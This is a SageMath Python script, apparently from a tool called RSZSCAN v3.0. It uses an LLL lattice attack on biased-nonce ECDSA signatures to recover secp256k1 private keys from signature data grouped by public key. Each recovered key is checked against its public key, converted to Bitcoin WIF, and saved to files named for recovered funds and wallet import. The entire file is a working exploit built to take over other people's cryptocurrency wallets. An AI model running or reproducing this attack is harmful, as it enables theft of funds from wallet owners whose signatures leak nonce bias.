#!/usr/bin/env sage
# ==============================================================================
# SAGE LLL ATTACK MODULE FOR RSZSCAN v3.0
# Solves Hidden Number Problem (HNP) for Biased Nonces
# optimized for Low-End PCs (Uses LLL instead of heavy BKZ)
# ==============================================================================

import sys
import json
import os
import csv
import hashlib
from sage.all import *

# Constants
N_CURVE = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
OUTPUT_CSV = "RECOVERED_FUNDS_FINAL.csv"
OUTPUT_WIF = "wallet_import_keys_final.txt"

def base58_encode(b):
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    x = int.from_bytes(b, "big")
    out = []
    while x > 0:
        x, rem = divmod(x, 58)
        out.append(alphabet[rem])
    for byte in b:
        if byte == 0: out.append("1")
        else: break
    return "".join(reversed(out))

def priv_to_wif(priv_hex, compressed=True):
    try:
        priv = bytes.fromhex("80" + priv_hex)
        if compressed: priv += b"\x01"
        chk = hashlib.sha256(hashlib.sha256(priv).digest()).digest()[:4]
        return base58_encode(priv + chk)
    except:
        return "Error"

def check_solution(candidate_priv, pub_hex):
    try:
        # We use a simple check: generate pubkey from priv and compare
        # Using Sage's Elliptic Curve lib
        F = GF(N_CURVE)
        K = GF(2**256 - 2**32 - 977) # Field of definition for secp256k1 coords
        E = EllipticCurve(K, [0, 7])
        G = E.point([0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
                     0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8])

        d = int(candidate_priv)
        Q = d * G

        # Format as hex
        x_bytes = int(Q[0]).to_bytes(32, 'big')
        y_bytes = int(Q[1]).to_bytes(32, 'big')

        # Check Uncompressed
        uncomp = (b'\x04' + x_bytes + y_bytes).hex()
        if uncomp == pub_hex.lower(): return True, False

        # Check Compressed
        prefix = b'\x02' if int(Q[1]) % 2 == 0 else b'\x03'
        comp = (prefix + x_bytes).hex()
        if comp == pub_hex.lower(): return True, True

        return False, False
    except Exception as e:
        # print(f"Check error: {e}")
        return False, False

def solve_hnp(signatures, pubkey_hex):
    """
    Solves HNP using LLL with corrected lattice construction.
    Inputs: list of dicts {r, s, z}, pubkey_hex
    """
    print(f"[*] Analyzing {len(signatures)} signatures for {pubkey_hex}...")

    n = N_CURVE
    m = len(signatures)

    # Limit m for performance
    if m > 40:
        print("[!] Limiting analysis to first 40 signatures...")
        m = 40
        signatures = signatures[:40]

    # Calculate t and u
    ts = []
    us = []

    for sig in signatures:
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        z = int(sig['z'], 16)

        try:
            sinv = inverse_mod(s, n)
            t = (sinv * r) % n
            u = (-sinv * z) % n
            ts.append(t)
            us.append(u)
        except ZeroDivisionError:
            continue

    if not ts: return None
    m = len(ts) # update m

    # Try different bias assumptions (bits of nonce size)
    # Common leaks: 252 bits (4 bit bias), 248 bits (8 bit bias)
    # 255 bits (1 bit bias) requires huge dimension
    biases = [252, 248, 244]

    for B in biases:
        print(f"[*] Attempting bias B={B} bits...")

        # Scaling factor K to balance the lattice
        # K * k_i approx K * 2^B
        # d approx 2^256
        # We want K * 2^B approx 2^256 => K approx 2^(256-B)
        K_val = 2**(256 - B)

        # Lattice Construction
        # Rows 0..m-1: (K*n, 0...0) at diagonal
        # Row m:       (K*t1, K*t2, ..., K*tm, 1, 0)
        # Row m+1:     (K*u1, K*u2, ..., K*um, 0, n)  <-- n at end for affine shift?
        # Actually standard SVP embedding for CVP:
        # Basis:
        # ( K*n, 0, ... 0 )
        # ...
        # ( K*t1, K*t2, ..., 1 )  <-- position m
        # ( K*u1, K*u2, ..., 0 )  <-- target embedding

        # We look for vector v = d * row_m + 1 * row_m+1 + ...
        # v = (K(d*t + u), d) approx (K*k, d)
        # Norm approx sqrt(m * (2^256)^2 + (2^256)^2)

        dim = m + 2
        M = Matrix(ZZ, dim, dim)

        # Diagonal K*n for first m rows
        for i in range(m):
            M[i, i] = K_val * n

        # Row m (coefficients t)
        for i in range(m):
            M[m, i] = K_val * ts[i]
        M[m, m] = 1 # Coefficient for d

        # Row m+1 (coefficients u - affine part)
        for i in range(m):
            M[m+1, i] = K_val * us[i]
        M[m+1, m+1] = n # Or 0 if we assume exact solution?
        # Actually usually we want close to zero.
        # Let's put 0 at M[m+1, m+1] and treat it as the "1" for the affine part if we used a different construction.
        # But here we assume u is part of the equation k = td + u.
        # We want to find d.
        # The vector (K*k1, ..., K*km, d) is in the lattice generated by:
        # (K*n) e_i
        # (K*t1, ..., 1)
        # shifted by (K*u1, ..., 0)

        # Correct embedding for SVP:
        # B = [ K*n ... 0   0 ]
        #     [ ... K*n 0   0 ]
        #     [ K*t ... 1   0 ]
        #     [ K*u ... 0   1 ]  <-- Using 1 here to force inclusion

        # Vector v = d * row_t + 1 * row_u + ...
        # v = (K(dt+u), d, 1) = (Kk, d, 1)
        # The last component is 1 (known).

        M[m+1, m+1] = 1

        # Run LLL
        try:
            M_red = M.LLL()
        except Exception:
            continue

        # Check for solution
        # We look for a row where the last element is +/- 1
        for row in M_red:
            if abs(row[m+1]) == 1:
                # Potential d is at index m
                candidate_d = row[m] * sign(row[m+1])
                candidate_d = int(candidate_d) % n

                if candidate_d <= 0: continue

                valid, is_comp = check_solution(candidate_d, pubkey_hex)
                if valid:
                    return (candidate_d, is_comp)

    return None

def process_file(filepath):
    print(f"\n[+] Loading {filepath}...")
    try:
        with open(filepath, 'r') as f:
            data = json.load(f)
    except Exception as e:
        print(f"[!] Error reading JSON: {e}")
        return

    signatures = data.get("signatures", [])
    if not signatures:
        print("[-] No signatures found.")
        return

    # Group by pubkey
    by_pub = {}
    for s in signatures:
        pk = s.get("pubkey")
        if pk:
            by_pub.setdefault(pk, []).append(s)

    for pub, sigs in by_pub.items():
        if len(sigs) < 10:
            print(f"[-] Skipping {pub}: Too few signatures ({len(sigs)}).")
            continue

        res = solve_hnp(sigs, pub)
        if res:
            priv_int, is_comp = res
            priv_hex = hex(priv_int)[2:].zfill(64)
            print(f"\n[SUCCESS] PRIVATE KEY RECOVERED: {priv_hex}")

            # Save
            wif = priv_to_wif(priv_hex, is_comp)
            with open(OUTPUT_CSV, "a", newline="") as f:
                writer = csv.writer(f)
                writer.writerow([pub, priv_hex, wif, "LLL_RECOVERED", "N/A", "N/A", "N/A"])

            with open(OUTPUT_WIF, "a") as f:
                f.write(wif + "\n")

            print(f"[+] Saved to {OUTPUT_CSV}")
        else:
            print(f"[-] Failed to recover {pub}.")

def main():
    if len(sys.argv) < 2:
        print("Usage: sage attack_lll.sage <path_to_json_report>")
        sys.exit(1)

    target = sys.argv[1]

    if os.path.isdir(target):
        for f in os.listdir(target):
            if f.endswith("_lll_data.json"):
                process_file(os.path.join(target, f))
    else:
        process_file(target)

if __name__ == "__main__":
    main()
